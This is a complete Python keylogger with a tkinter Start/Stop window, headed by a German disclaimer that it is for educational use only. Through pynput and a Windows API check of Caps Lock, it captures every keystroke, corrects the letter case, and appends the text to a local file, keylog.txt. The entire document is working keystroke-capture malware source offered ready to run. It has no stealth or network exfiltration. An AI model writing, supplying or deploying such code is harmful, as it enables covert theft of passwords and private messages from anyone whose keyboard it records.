#Dieses Skript dient ausschließlich zu Bildungszwecken.
#Die Nutzung für illegale Zwecke ist verboten.
#Der Autor übernimmt keine Haftung für Schäden oder Missbrauch.
import tkinter as tk
from pynput import keyboard
import ctypes

is_logging = False
listener = None
log_file = "keylog.txt"
shift_pressed = False

def is_capslock_on():
    # Windows API call to get Caps Lock state
    return ctypes.WinDLL("User32.dll").GetKeyState(0x14) & 0xffff != 0

def on_press(key):
    global shift_pressed
    if not is_logging:
        return

    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
        shift_pressed = True
        return

    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.enter:
            char = '\n'
        elif key == keyboard.Key.space:
            char = ' '
        else:
            char = f'[{key.name}]'

    if len(char) == 1 and char.isalpha():
        caps = is_capslock_on()
        if (caps and not shift_pressed) or (not caps and shift_pressed):
            char = char.upper()
        else:
            char = char.lower()

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(char)

def on_release(key):
    global shift_pressed
    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
        shift_pressed = False

def start_logging():
    global is_logging, listener
    is_logging = True
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_label.config(text="Status: Recording")

def stop_logging():
    global is_logging, listener
    is_logging = False
    if listener:
        listener.stop()
    status_label.config(text="Status: Stopped")

root = tk.Tk()
root.title("Keylogger (Lernversion)")
root.geometry("280x140")
root.resizable(False, False)

frame = tk.Frame(root, padx=20, pady=20)
frame.pack(expand=True)

start_btn = tk.Button(frame, text="Start", command=start_logging, width=12)
stop_btn = tk.Button(frame, text="Stop", command=stop_logging, width=12)
status_label = tk.Label(frame, text="Status: Idle", anchor="center")

start_btn.grid(row=0, column=0, padx=5, pady=5)
stop_btn.grid(row=0, column=1, padx=5, pady=5)
status_label.grid(row=1, column=0, columnspan=2, pady=10)

root.mainloop()